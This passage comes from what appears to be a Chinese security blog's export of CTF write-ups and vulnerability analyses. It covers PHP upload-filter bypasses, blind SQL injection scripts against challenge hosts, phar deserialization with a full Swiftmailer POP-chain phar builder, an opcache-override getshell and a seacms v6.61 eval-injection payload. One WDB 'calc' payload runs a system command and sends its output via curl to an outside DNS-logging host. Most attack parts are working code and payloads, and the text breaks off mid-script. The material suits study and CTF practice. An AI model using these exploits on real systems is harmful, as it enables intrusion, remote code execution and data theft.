if(@substr(file($_)[0],0,6)==='@&lt;?php' &amp;&amp; strpos($_,$new_name)===false)&#123; include($_); &#125; unlink($new_name); &#125; else&#123; highlight_file(__FILE__); &#125; 首先要绕过1end($filename)==$filename[count($filename) - 1] 前者是数组里最后一个元素，后者取根据数组下标来取的值。所以，我们只需要让下标等于count($filename) - 1的元素不是数组最后一个元素即可。例如1[1=&gt;'123', 5=&gt;'php'] 此时12end($filename)='php'count($filename)-1=1 ,$filename[1]=NULL 即可绕过检测，构造表单上传没有打印 emmmm 成功绕过然后是要将上传的文件重新命名12$new_name = (string)rand(100,999).\".\".$ext; move_uploaded_file($_FILES['file']['tmp_name'],$new_name); $ext即为上传的file[2]内容接下来他会进行判断然后进行包含。123if(@substr(file($_)[0],0,6)==='@&lt;?php' &amp;&amp; strpos($_,$new_name)===false)&#123; include($_); &#125; 这里都很好处理，最后有个unlink函数会删除上传的文件我们用 123.php/.进行绕过。最终上传文件此时已经在沙盒内生成一个XXX.123的文件。接下来爆破文件对XXX进行爆破爆破到文件名为100.123执行命令拿flag web4注入得到密码在id先进行注入11' and 1=1%23 成功闭合发现过滤了 information_schema.卡在这里很久，最后才找到方法绕过1information_schema . tables 本地测试发现空格可以绕过这样的检测其中还过滤了from，limit等关键词，最终构造语句11' and (ascii(substr((SELECT GROUP_CONCAT(table_name) FROM information_schema . tables WHERE table_schema=database()),1,1))=1)%23 盲注脚本12345678910111213141516# encoding=utf-8import requestsimport stringurl='http://495461f9167c4156a993dfa226d99f944a9e804913c04884.game.ichunqiu.com/select_guest.php?id='flag=''for i in range(1,100): for j in range(33,127): #payload=\"1' and (ascii(substr((SELECT GROUP_CONCAT(table_name) FROM information_schema . tables WHERE table_schema=database()),%d,1))=%d)%%23&amp;Submit=Select+Guest\"%(i,j) #payload=\"1' and (ascii(substr((SELECT GROUP_CONCAT(column_name) FROM information_schema . columns WHERE table_schema=database() and table_name='user'),%d,1))=%d)%%23&amp;Submit=Select+Guest\"%(i,j) payload=\"1' and (ascii(substr((SELECT GROUP_CONCAT(password) FROM user),%d,1))=%d)%%23&amp;Submit=Select+Guest\"%(i,j) url1=url+payload r=requests.get(url=url1) if '10.10.1.1' in r.content: flag=flag+chr(j) print flag break 得到管理员密码的MD5值，然后去网站解密得到管理员密码adminpassword 上传截断登陆进去后发现一个上传页面，随手尝试一下。尝试大写小bypass得到提示please upload to ./flag.php那么就要构造路径为./flag.php发现下面有个hidden的参数uploaddir我们可以通过拼接uploaddir和filename的方式构造php成功构造flag.php，但是自动加上的后缀txt有点无解这时候就想到00截断失败了。。这时候就卡了很久，执念于心提示02可以截断自闭了。这样也可以。最后去google也没查到02截断是什么操作。。 misc92拿到一个txt文件观察发现文件第一行末是一个倒置PNG头文件最后一行是一个word文件头。 随即经过两种方式的倒序得到一个加密的word文件和一个PNG图片 扫描二维码得到&gt;:2?kEaX 根据题目名字92尝试base92解密得到 Passwd 作为密码打开word文档移开二维码发现了隐藏信息 通过扫描二维码得到一部分flag又在”文档隐藏”上方发现一部分flag。 最后通过提示imag steganography找到steganography工具。 从”YOU ARE ALIVE”图片中找到一段flag。拼接成完整的flag。 nofind打开流量包一波观察后在tcp流中发现上传了一个压缩包 通过导出http对象拿到文件 example1(1).php Binwalk -e 分离出一个图片 尝试各种隐写解密都没用。主办方提示openpuff。 找到软件后发现需要三个密码根据图片中的ct??????猜想密码可能为这8位字符串。需要我们找到??????的值。 再回到导出http对象中发现了三个奇怪的crc32值 利用crc32爆破脚本尝试进行6字节的crc32爆破。 如上分别对三个CRC32值爆破。 又有提示爆破结果包含f。 最终得到3个值 ct93fjhl ctmbof3k ctv4gfx1 作为三个密钥输入openpuff中解得flag。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"},{"name":"wp","slug":"wp","permalink":"http://altman.vip/tags/wp/"}]},{"title":"phar反序列化rce","slug":"phar反序列化rce","date":"2018-10-26T02:54:15.000Z","updated":"2018-11-26T10:03:21.588Z","comments":true,"path":"2018/10/26/phar反序列化rce/","link":"","permalink":"http://altman.vip/2018/10/26/phar反序列化rce/","excerpt":"前言在Blackhat2018，来自Secarma的安全研究员Sam Thomas讲述了一种攻击PHP应用的新方式，利用这种方法可以在不使用unserialize()函数的情况下触发PHP反序列化漏洞。","text":"前言在Blackhat2018，来自Secarma的安全研究员Sam Thomas讲述了一种攻击PHP应用的新方式，利用这种方法可以在不使用unserialize()函数的情况下触发PHP反序列化漏洞。 原理在使用phar://协议读取文件时，文件会被解析成phar（ http://php.net/manual/zh/intro.phar.php ）解析过程中会触发php_var_unserialize()函数，造成反序列化。 测试漏洞利用条件1.服务器上存在可控文件2.服务器端引用了可以利用的魔术方法3.文件操作函数的参数可控 测试代码在本地搭建一个简单的环境来测试（php7.1+apache2)本地测试代码1234567891011&lt;?phpclass altman&#123; private $a='echo 'test''; function __destruct() &#123; eval($this-&gt;a); &#125;&#125;file_exists($_GET['file']);?&gt; 生成phar文件首先要将本地php.ini中的phar.readonly选项设置为Off然后构造一个生成phar文件的php脚本123456789101112131415161718&lt;?phpclass altman&#123; private $a='echo \"test\";'; function __destruct() &#123; eval($this-&gt;a); &#125;&#125;$f = new altman();$f-&gt;a='phpinfo()';$phar = new Phar(\"phar.phar\");$phar-&gt;startBuffering();$phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //设置stub$phar-&gt;setMetadata($f); //将自定义meta-data存入manifest$phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件$phar-&gt;stopBuffering();?&gt; 生成如下phar文件，可以看到文件中metadata部分含有我们构造的恶意序列化代码 触发漏洞通过测试代码中的file_exists()来访问phar文件，利用phar://协议解析文件。成功执行phpinfo 护网杯 easy_lavarel题目doocker环境https://github.com/sco4x0/huwangbei2018_easy_laravel 浏览源码查看首页注释中拿到整个网站的源码，浏览发现使用lavarel框架写的。先查看路由直接去看一下flag获取方式没什么用，继续全局搜索flag定位到关键点，到这里就题目意图就很明显了，要登录邮箱为admin@qvq.im的账号来查看flag。 sql注入尽管可以注册任意用户，但是无法覆盖邮箱，寻找其他突破口在NoteController.php中找到一处注入点显然二次注入,常规的union注入拿到管理员密码有点自闭，密码加密过的，无法破解，只能另寻他路来登录管理员账号 重置密码发现了重置密码功能，仔细读代码，发现只要得到账号的token，就能拿到重置密码的linktoken在password_resets表中进行注入然后直接访问link /password/reset/{token}重置管理员密码成功登陆发现noflag ？？？ BladeBlade 是 laravel 提供的一个简单强大的模板引擎，它就是把 Blade 视图编译成原生的 PHP 代码并缓存起来。缓存会在 Blade 视图改变时而改变。由于旧的缓存存在，所以我们访问flag时会加载缓存，从而无法访问到新的flag。所以这里需要想办法删除掉blade文件缓存。先找到缓存文件的路径1234public function getCompiledPath($path)&#123; return $this-&gt;cachePath.'/'.sha1($path).'.php';&#125; 又有提示nginx默认配置，那么可以找到flag文件的path是1/usr/share/nginx/html/resources/views/auth/flag.blade.php 那么最终得到1/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php POP CHAIN已经确认了缓存文件的目录。下面就要寻找一个可控的删除函数。通过composer.json，安装网站的组件。在组件中寻找删除函数，全局搜索定位unlink()最终在swiftmailer/swiftmailer/lib/classes/Swift/ByteStream/TemporaryFileByteStream.php中找到了一个可以利用的_destruck() phar反序列化发现一个check很可疑，查看源码很明显的一个file_exists函数，这不就是可以出发phar反序列化的函数吗？ 到这里整个题目思路就很明确了：①构造phar文件并上传②通过check触发file_exists()引发反序列化③执行unlink删除旧的缓存文件④再次访问flag 构造phar文件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091&lt;?phpclass Swift_ByteStream_AbstractFilterableInputStream &#123; /** * Write sequence. */ protected $sequence = 0; /** * StreamFilters. * * @var Swift_StreamFilter[] */ private $filters = []; /** * A buffer for writing. */ private $writeBuffer = ''; /** * Bound streams. * * @var Swift_InputByteStream[] */ private $mirrors = [];&#125;class Swift_ByteStream_FileByteStream extends Swift_ByteStream_AbstractFilterableInputStream &#123; /** The internal pointer offset */ private $_offset = 0; /** The path to the file */ private $_path; /** The mode this file is opened in for writing */ private $_mode; /** A lazy-loaded resource handle for reading the file */ private $_reader; /** A lazy-loaded resource handle for writing the file */ private $_writer; /** If magic_quotes_runtime is on, this will be true */ private $_quotes = false; /** If stream is seekable true/false, or null if not known */ private $_seekable = null; /** * Create a new FileByteStream for $path. * * @param string $path * @param bool $writable if true */ public function __construct($path, $writable = false) &#123; $this-&gt;_path = $path; $this-&gt;_mode = $writable ? 'w+b' : 'rb'; if (function_exists('get_magic_quotes_runtime') &amp;&amp; @get_magic_quotes_runtime() == 1) &#123; $this-&gt;_quotes = true; &#125; &#125; /** * Get the complete path to the file. * * @return string */ public function getPath() &#123; return $this-&gt;_path; &#125;&#125;class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream &#123; public function __construct() &#123; $filePath = \"/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php\"; parent::__construct($filePath, true); &#125; public function __destruct() &#123; if (file_exists($this-&gt;getPath())) &#123; @unlink($this-&gt;getPath()); &#125; &#125;&#125;$obj = new Swift_ByteStream_TemporaryFileByteStream();$p = new Phar('./1.phar', 0);$p-&gt;startBuffering();$p-&gt;setStub('GIF89a&lt;?php __HALT_COMPILER(); ?&gt;');$p-&gt;setMetadata($obj);$p-&gt;addFromString('1.txt','text');$p-&gt;stopBuffering();rename('./1.phar', '1.gif');?&gt; check上传文件后，在check处抓包，控制path值，利用phar://去解析我们上传的文件，造成反序列化。然后再去请求flag","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"}]},{"title":"0ctf-Ezdoor","slug":"0ctf-Ezdoor","date":"2018-10-10T11:51:13.000Z","updated":"2018-11-02T05:39:45.562Z","comments":true,"path":"2018/10/10/0ctf-Ezdoor/","link":"","permalink":"http://altman.vip/2018/10/10/0ctf-Ezdoor/","excerpt":"前言复现以前几个月前的0ctf-Ezdoor，一个关于php7_opcache_override的题目。","text":"前言复现以前几个月前的0ctf-Ezdoor，一个关于php7_opcache_override的题目。 环境https://github.com/LyleMi/My-CTF-Challengesdockerfile有一点问题，需要加一句1RUN mkdir /var/www/html/sandbox/ 而且因为php更新，docker的php镜像不再是7.0.28，而是7.0.32。解题过程中要注意版本为7.0.32，其他不变。 题目分析简单粗暴的源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;?phperror_reporting(0);$dir = 'sandbox/' . sha1($_SERVER['REMOTE_ADDR']) . '/';if(!file_exists($dir))&#123; mkdir($dir);&#125;if(!file_exists($dir . \"index.php\"))&#123; touch($dir . \"index.php\");&#125;function clear($dir)&#123; if(!is_dir($dir))&#123; unlink($dir); return; &#125; foreach (scandir($dir) as $file) &#123; if (in_array($file, [\".\", \"..\"])) &#123; continue; &#125; unlink($dir . $file); &#125; rmdir($dir);&#125;switch ($_GET[\"action\"] ?? \"\") &#123; case 'pwd': echo $dir; break; case 'phpinfo': echo file_get_contents(\"phpinfo.txt\"); break; case 'reset': clear($dir); break; case 'time': echo time(); break; case 'upload': if (!isset($_GET[\"name\"]) || !isset($_FILES['file'])) &#123; break; &#125; if ($_FILES['file']['size'] &gt; 100000) &#123; clear($dir); break; &#125; $name = $dir . $_GET[\"name\"]; if (preg_match(\"/[^a-zA-Z0-9.\\/]/\", $name) || stristr(pathinfo($name)[\"extension\"], \"h\")) &#123; break; &#125; move_uploaded_file($_FILES['file']['tmp_name'], $name); $size = 0; foreach (scandir($dir) as $file) &#123; if (in_array($file, [\".\", \"..\"])) &#123; continue; &#125; $size += filesize($dir . $file); &#125; if ($size &gt; 100000) &#123; clear($dir); &#125; break; case 'shell': ini_set(\"open_basedir\", \"/var/www/html/$dir:/var/www/html/flag\"); include $dir . \"index.php\"; break; default: highlight_file(__FILE__); break;&#125; 六个点①根据你IP的hash值为你单独创造一个沙盒②打印phpinfo.txt③重置为你创造的沙盒④打印时间戳⑤上传文件到刚才的沙盒，后缀名不允许出现’h’⑥包含你的沙盒内的index.php 题目要求直截了当，绕过过滤覆盖掉沙盒内的index.php,通过shell功能来执行命令。 解法一（预期解）php7环境内开启了opcache，可以通过覆盖缓存文件来getshell。 获取路径首先要知道缓存路径，缓存文件会生成在opcache.file_cache+system_id.通过phpinfo可以得到以下内容1234opcache.file_cache =&gt; /tmp/cache =&gt; /tmp/cachephp_version = \"7.0.32\"zend_extension_id = \"API320151012,NTS\"zend_bin_id = \"BIN_SIZEOF_CHAR48888\" 通过脚本计算system_id1234567def systemid(): from md5 import md5 php_version = \"7.0.32\" zend_extension_id = \"API320151012,NTS\" zend_bin_id = \"BIN_SIZEOF_CHAR48888\" return md5(php_version + zend_extension_id + zend_bin_id).hexdigest()print systemid() 此时已经知道了缓存路径1/tmp/cache/8080d5c8053a7a50e39ace1fda848e85 伪造缓存文件然后就要伪造index.php.bin文件了。在本地搭建一个完全一样的php环境，然后放一个恶意文件shell.php在服务器中，访问这个文件。然后去opcache路径下寻找到shell.php.bin.恶意文件就伪造好了。 更改timestamps此时再次注意到，题目中开启了opcache.validate_timestamps =&gt; On =&gt; Ontimestamps是文件生成时间，在php缓存机制中，如果缓存文件与原文件timestamps不一致，php会重新生成新的缓存文件来覆盖timestamps错误的缓存。所以我们需要得知index.php.bin的时间戳。题目中我们可以通过脚本连续访问reset功能和time功能来获取文件的timestamps。123print int(requests.get(url=url+\"?action=time\").content)r=requests.get(url=base_url+\"?action=reset\")print int(requests.get(url=url+\"?action=time\").content) 得到了时间戳，然后更改bin文件的时间戳这样就构造好了完整的index.php.bin。构造POST包上传文件覆盖成功后访问?action=shell,成功执行上传php代码。 执行命令题目BAN掉了大部分命令，但是可以使用 file_get_contents和scandir最后使用123&lt;?phpvar_dump(scandir('/var/www/html/flag'));?&gt; 123&lt;?file_get_contents('/var/www/html/flag/93f4c28c0cf0b07dfd7012dca2cb868cc0228cad');//这是个bin文件，最好转成base64再打印出来。 发现是个opcache头的bin文件，剩下的就是逆向大佬的事情了 解法二（非预期）使用aa/../index.php/.即可绕过检测。 原理直接查看php的底层实现文件路径处理的代码tsrm_realpath()1234567891011121314151617181920212223i = len; // i的初始值为字符串的长度 while (i &gt; start &amp;&amp; !IS_SLASH(path[i-1])) &#123; i--; // 把i定位到第一个/的后面 &#125; if (i == len || (i == len - 1 &amp;&amp; path[i] == '.')) &#123; len = i - 1; // 删除路径中最后的 /. , 也就是 /path/test.php/. 会变为 /path/test.php is_dir = 1; continue; &#125; else if (i == len - 2 &amp;&amp; path[i] == '.' &amp;&amp; path[i+1] == '.') &#123; //删除路径结尾的 /.. is_dir = 1; if (link_is_dir) &#123; *link_is_dir = 1; &#125; if (i - 1 &lt;= start) &#123; return start ? start : len; &#125; j = tsrm_realpath_r(path, start, i-1, ll, t, use_realpath, 1, NULL TSRMLS_CC); // 进行递归调用的时候，这里把strlen设置为了i-1， php会递归删除文件名后的/.和/..我们上传index.php/.会被处理为index.php这样就绕过了检测，但是这样的上传不会覆盖已有文件内容。具体原因如下12345678910111213141516171819201077 if (save &amp;&amp; php_sys_lstat(path, &amp;st) &lt; 0) &#123;1078 if (use_realpath == CWD_REALPATH) &#123;1079 /* file not found */1080 return -1;1081 &#125;1082 /* continue resolution anyway but don't save result in the cache */1083 save = 0;1084 &#125; 1120 if (save) &#123;1121 directory = S_ISDIR(st.st_mode);1122 if (link_is_dir) &#123;1123 *link_is_dir = directory;1124 &#125;1125 if (is_dir &amp;&amp; !directory) &#123;1125 /* not a directory */1127 free_alloca(tmp, use_heap);1128 return -1;1129 &#125;1130 &#125; 是一个宏定义，其实是系统函数lstat,主要功能是获取文件的描述信息存入st结构体中,由于上面分析会删除掉路径中的/.，所以调用时传入的test.php 。 当第一次执行时不存在test.php文件，函数php_sys_lstat返回 -1,所以第1083行会被执行，重置save为0，所以1120-1130行都没有被执行。 当第二次执行，覆盖老文件的时候，test.php已经是一个存在的文件了，所以php_sys_lstat返回0，st中存储的是一个文件的信息，save还是1，导致1120-1130行被执行。由于之前php认为test.php/. 是一个目录（is_dir是1），现在有获取到test.php 是一个文件，所以is_dir &amp;&amp; !directory为true，函数返回了-1，得到的路径长度出错，所以无法覆盖老文件了。 move_uploaded_file()查看move_uploaded_file()的底层代码1234567phpif (VCWD_RENAME(path, new_path) == 0) &#123; successful = 1; &#125; else if (php_copy_file_ex(path, new_path, STREAM_DISABLE_OPEN_BASEDIR) == SUCCESS) &#123; VCWD_UNLINK(path); successful = 1; &#125; 由于index.php已经存在，会返回0，那么我们拼接上一个不存在路径 aa/../index.php/.php_sys_lstat返回-1，就可以成功覆盖文件。 最终payload aa/../index.php","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"}]},{"title":"dangerous-phpinfo","slug":"dangerous-phpinfo","date":"2018-10-08T03:34:42.000Z","updated":"2018-11-02T05:40:45.436Z","comments":true,"path":"2018/10/08/dangerous-phpinfo/","link":"","permalink":"http://altman.vip/2018/10/08/dangerous-phpinfo/","excerpt":"关于phpinfo()的不适当配置造成的危险漏洞 前言本文章测试环境基于osx+apache2+php5.6","text":"关于phpinfo()的不适当配置造成的危险漏洞 前言本文章测试环境基于osx+apache2+php5.6 0x00 session.upload_progress原理分析先来看php手册中给的定义 【http://php.net/manual/zh/session.upload-progress.php】 当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。 意味着我们可以通过向服务器POST一个表单,来控制$_session的内容。构建一个简单的环境来测试。12345&lt;?php$code=$_GET['code'];print_r($code);eval($code);?&gt; 通过phpinfo获得路径信息，session.upload_progress.name。然后构造上传文件的表单。直接引用官方的表单123456&lt;form action=\"upload.php\" method=\"POST\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"hidden\" name=\"&lt;?php echo ini_get(\"session.upload_progress.name\"); ?&gt;\" value=\"123\" /&gt; &lt;input type=\"file\" name=\"file1\" /&gt; &lt;input type=\"file\" name=\"file2\" /&gt; &lt;input type=\"submit\" /&gt;&lt;/form&gt; 稍做修改123456&lt;form action=\"upload.php\" method=\"POST\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"&lt;?php echo 666;?&gt;\" /&gt; &lt;input type=\"file\" name=\"file1\" /&gt; &lt;input type=\"file\" name=\"file2\" /&gt; &lt;input type=\"submit\" /&gt;&lt;/form&gt; 抓包后稍作修改，即可把value中的代码写入/tmp/sess_*中，再配合上LFI即可getshell。 CTF实战http://web.jarvisoj.com:32784/通过1ini_set('session.serialize_handler', 'php'); 知道使用的序列化处理器为php，通过查看phpinfo可知默认为php_serialize。再看到session.upload_progress.enabled=&gt;on.很明显我们要通过Session Upload Progress来设置session，触发反序列化。构造反序列化字符串12|O:5:\\\"OowoO\\\":1:&#123;s:4:\\\"mdzz\\\";s:38:\\\"print_r(scandir('/opt/lampp/htdocs'));\\\";&#125;//反斜杠防止引号被转义 构造POST文件的数据包成功执行命令剩下的就是常规操作了 0x01 phpinfo()+LFI同样是上传文件,POST一个文件上去后可以再phpinfo中看到文件的信息![]在tmp目录下生成一个名为phpXXXXXX的文件，内容为POST的文件内容。但是它只会存在一瞬间，所以需要条件竞争来触发它。我们使用同一个数据包来发送文件并且查看文件。![]如果同时存在LFI，我们包含这个这个phpXXXXXXX文件就可以getshell了。 0X02 OPCACHE覆盖原理当phpinfo()中opcache.enable =&gt; On =&gt; On时，访问网站index.php时，网站会生成index.php.bin。再次访问时，会加载index.php.bin。而存在上传时，如果可以找到index.php.bin文件所在的目录，我们就可以覆盖index.php.bin，下一次访问index.php时，会加载我们上传的恶意index.php.bin。 CTF实战见博客https://altmanz.cn/2018/10/10/0ctf-Ezdoor/","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"}]},{"title":"seacms v6.61-GetShell","slug":"seacmsv6.61-getshell","date":"2018-09-27T01:11:07.000Z","updated":"2018-11-02T05:46:03.838Z","comments":true,"path":"2018/09/27/seacmsv6.61-getshell/","link":"","permalink":"http://altman.vip/2018/09/27/seacmsv6.61-getshell/","excerpt":"关于seacms v6.61后台getshell的深入分析","text":"关于seacms v6.61后台getshell的深入分析 环境采用ubuntu16.04+apache2+php5.6+mysql5.7搭建时踩了很多坑，过程十分艰难。。 漏洞复现在后台-&gt;添加影片-&gt;图片地址出注入代码1&#123;if:1)$GLOBALS['_G'.'ET'][a]($GLOBALS['_G'.'ET'][b]);//&#125;&#123;end if&#125; 之后访问1/detail/index.php?1.html&amp;m=admin&amp;a=assert&amp;b=phpinfo() 即可getshell 审计代码先从他的注入点追踪,在图片地址处输入test然后抓包测试，直接定位到关键文件admin/admin_video.php，GET参数action=save&amp;acttype=add，和变量v_pic.在admin_video.php中寻找v_pic变量跟进cn_substrR函数是一个对变量进行安全处理的函数, 继续跟进acttype=add，v_pic已经存入数据库。此时污点数据追踪到头了。转头去分析漏洞利用页面/details/index.php?1.html首先对url截取，然后强转int,得到了cfg_paramid然后在 echoContent 函数中取出来了v_pic参数，并进行处理，将v_pic拼接到了content中，继续追踪$content，定位到语句1$content=$mainClassObj-&gt;parseIf($content); 跟进parseIf函数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354function parseIf($content)&#123; if (strpos($content,'&#123;if:')=== false)&#123; return $content; &#125;else&#123; $labelRule = buildregx(\"&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;\",\"is\"); $labelRule2=\"&#123;elseif\"; $labelRule3=\"&#123;else&#125;\"; preg_match_all($labelRule,$content,$iar); foreach($iar as $v)&#123; $iarok[] = str_ireplace(array('unlink','opendir','mysqli_','mysql_','socket_','curl_','base64_','putenv','popen(','phpinfo','pfsockopen','proc_','preg_','_GET','_POST','_COOKIE','_REQUEST','_SESSION','_SERVER','assert','eval(','file_','passthru(','exec(','system(','shell_'), '@.@', $v); &#125; $iar = $iarok; $arlen=count($iar[0]); $elseIfFlag=false; for($m=0;$m&lt;$arlen;$m++)&#123; $strIf=$iar[1][$m]; $strIf=$this-&gt;parseStrIf($strIf); $strThen=$iar[2][$m]; $strThen=$this-&gt;parseSubIf($strThen); if (strpos($strThen,$labelRule2)===false)&#123; if (strpos($strThen,$labelRule3)&gt;=0)&#123; $elsearray=explode($labelRule3,$strThen); $strThen1=$elsearray[0]; $strElse1=$elsearray[1]; @eval(\"if(\".$strIf.\")&#123;\\$ifFlag=true;&#125;else&#123;\\$ifFlag=false;&#125;\"); if ($ifFlag)&#123; $content=str_replace($iar[0][$m],$strThen1,$content);&#125; else &#123;$content=str_replace($iar[0][$m],$strElse1,$content);&#125; &#125;else&#123; @eval(\"if(\".$strIf.\") &#123; \\$ifFlag=true;&#125; else&#123; \\$ifFlag=false;&#125;\"); if ($ifFlag) $content=str_replace($iar[0][$m],$strThen,$content); else $content=str_replace($iar[0][$m],\"\",$content);&#125; &#125;else&#123; $elseIfArray=explode($labelRule2,$strThen); $elseIfArrayLen=count($elseIfArray); $elseIfSubArray=explode($labelRule3,$elseIfArray[$elseIfArrayLen-1]); $resultStr=$elseIfSubArray[1]; $elseIfArraystr0=addslashes($elseIfArray[0]); @eval(\"if($strIf)&#123;\\$resultStr=\\\"$elseIfArraystr0\\\";&#125;\"); for($elseIfLen=1;$elseIfLen&lt;$elseIfArrayLen;$elseIfLen++)&#123; $strElseIf=getSubStrByFromAndEnd($elseIfArray[$elseIfLen],\":\",\"&#125;\",\"\"); $strElseIf=$this-&gt;parseStrIf($strElseIf); $strElseIfThen=addslashes(getSubStrByFromAndEnd($elseIfArray[$elseIfLen],\"&#125;\",\"\",\"start\")); @eval(\"if(\".$strElseIf.\")&#123;\\$resultStr=\\\"$strElseIfThen\\\";&#125;\"); @eval(\"if(\".$strElseIf.\")&#123;\\$elseIfFlag=true;&#125;else&#123;\\$elseIfFlag=false;&#125;\"); if ($elseIfFlag) &#123;break;&#125; &#125; $strElseIf0=getSubStrByFromAndEnd($elseIfSubArray[0],\":\",\"&#125;\",\"\"); $strElseIfThen0=addslashes(getSubStrByFromAndEnd($elseIfSubArray[0],\"&#125;\",\"\",\"start\")); if(strpos($strElseIf0,'==')===false&amp;&amp;strpos($strElseIf0,'=')&gt;0)$strElseIf0=str_replace('=', '==', $strElseIf0); @eval(\"if(\".$strElseIf0.\")&#123;\\$resultStr=\\\"$strElseIfThen0\\\";\\$elseIfFlag=true;&#125;\"); $content=str_replace($iar[0][$m],$resultStr,$content); &#125; &#125; return $content; &#125; &#125; parseIf函数对$content进行了简单的正则和黑名单后进行了eval执行。再回到CVE利用的payload1&#123;if:1)$GLOBALS['_G'.'ET'][a]($GLOBALS['_G'.'ET'][b]);//&#125;&#123;end if&#125; payload用简单的字符串拼接绕过了正则，利用$GLOBALS执行了代码。1@eval(\"if(\".$strIf.\") &#123; \\$ifFlag=true;&#125; else&#123; \\$ifFlag=false;&#125;\"); 相当于 @eval($_GETa); 总结一下流程:①$v_pic注入恶意数据存入数据库②echoContent()取出$v_pic，拼接进$content③parseIf()中eval()执行$content中的代码 第二条攻击链parseif()函数由于过滤不严格导致了getshell，而整个框架中利用了多次parseif()函数。通过定位parseIf以及寻找可控变量可以发现第二条攻击链。在模板变量中发现了{playpage:from}，定位到这个变量在video/index.php中来自v_playdata继续跟进v_playdata，通过admin_collect.php中$v_playfrom,$v_playurl存入数据库。继续跟进$v_playfrom,$v_playurl,定位到admin/back/templets/admin_video_edit.htm通过播放来源传入参数v_playfrom。测试一遍攻击路线，通过后台系统设置，添加播放源，在播放源处添加攻击代码1&#123;if:1)$GLOBALS['_G'.'ET'][a]($GLOBALS['_G'.'ET'][b]);die();//&#125;&#123;end if&#125; 添加成功，然后选择添加影片，播放源选择我们注入的代码。注意此时v_playfrom[1]只截取了部分payload，需要抓包修改v_playfrom[1]的内容，添加成功后访问12http://127.0.0.1/video/index.php?1-0-0.html&amp;a=assert&amp;b=phpinfo();//1-0-0.html是刚添加的影片编号 成功getshell。 攻击链总结①通过v_playfrom传入恶意代码，存入v_playdata②添加影片通过选择恶意播放源载入v_playdata中的恶意代码③video/index.php播放影片时加载v_playdata，拼接进$content④触发parseIf($content)执行恶意代码","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"}]},{"title":"WDB.2","slug":"WDB-2","date":"2018-08-22T08:09:42.000Z","updated":"2018-11-02T05:44:22.418Z","comments":true,"path":"2018/08/22/WDB-2/","link":"","permalink":"http://altman.vip/2018/08/22/WDB-2/","excerpt":"网鼎杯第二场writeup","text":"网鼎杯第二场writeup WEBcalc计算器功能，其中有正则显示。随手测试发现网站后端是用python写的。尝试在计算器功能中执行命令，发现无法回显。然后尝试DNS带出数据成功11+1+().__class__.__bases__[0].__subclasses__()[59].__enter__.__func__.__getattribute__('__global' + 's__')['s'+'ys'].modules['o'+'s'].__getattribute__('sy' + 'stem')(\"curl ghljcn.ceye.io/`whoami | base64`\") 然后查找 ‘find / -name flag’读flag ‘cat /flag’ wafupload代码审计，考点比较老了，之前在pwnhub的公开赛上出现过，就不详细解释了，关键点在php的对数组的end函数和count()-1对比产生的的差异，可以导致任意文件上传 然后在根目录下翻到flag，直接cat读即参考https://www.virzz.com/2017/09/20/pwnhub_writeups_sha_fu_fu_workdays.html sqlweb弱密码admin admin123登陆成功，然后提示给了表明列名删除cookie重新登录，发现了黑名单，但是没有过滤小于号，尝试注入，单引号闭合成功。payload：wuyanzu’/**/&amp;&amp;passwd&lt;’%s’#直接贴上脚本123456789101112131415161718192021222324#!/usr/bin/env python#Author:Sublime#coding:utf-8import requests as reqimport stringurl = 'http://7c9f5cab07ae428daedba75e55df7f9ed9d32408d5754c2f.game.ichunqiu.com/sql.php'data = &#123; 'uname':'', 'passwd':'admin123', 'submit':'1'&#125;payload = \"\"\"wuyanzu'/**/&amp;&amp;passwd&lt;'%s'#\"\"\"flag = ''# for x in range(1,100):# for y in range(30,127):# print y# payload1 = payload%(flag+chr(y))# data['uname'] = payload1# f = req.post(url,data)# if 'passwd error' in f.content:# flag += chr(y-1)# print flag# breakprint 'FLAG&#123;1BDE8B12-D7C6-4E53-BBC1-5BA1F7A8CCE4&#125;'.lower() unfinished这是一个二次注入，发现注册页面后尝试注册 altman’ or 1=1#登陆后发现用户名为 1 ，应该是bool盲注题目过滤了很关键的逗号和information我们只能用join绕过,最后写得脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/usr/bin/env python#Author:Sublime#coding:utf-8import requests as reqimport stringimport randomurl = 'http://6e38e15412a349e2bc0d3a7c28f23457be8f9872113449bc.game.ichunqiu.com/'def reg(email,payload): data = &#123; 'email':email, 'username':payload, 'password':'aaa' &#125; cookie = &#123; 'PHPSESSID':'sba5or9h0mgsh2lr7boe8knji7' &#125; f = req.post(url+'register.php',data=data,cookies=cookie,allow_redirects=False) # print f.contentdef login(email): data1 = &#123; 'email':email, 'password':'aaa' &#125; cookie = &#123; 'PHPSESSID':'sba5or9h0mgsh2lr7boe8knji7' &#125; f = req.post(url+'login.php',data=data1,cookies=cookie) # print f.content if \"\"\"&lt;span class=\"user-name\"&gt; -1 &lt;/span&gt;\"\"\" in f.content: return 1flag = ''for x in range(1,100): for y in string.printable: payload = \"admin'-(ascii(mid(reverse(mid((select * from (select i.1 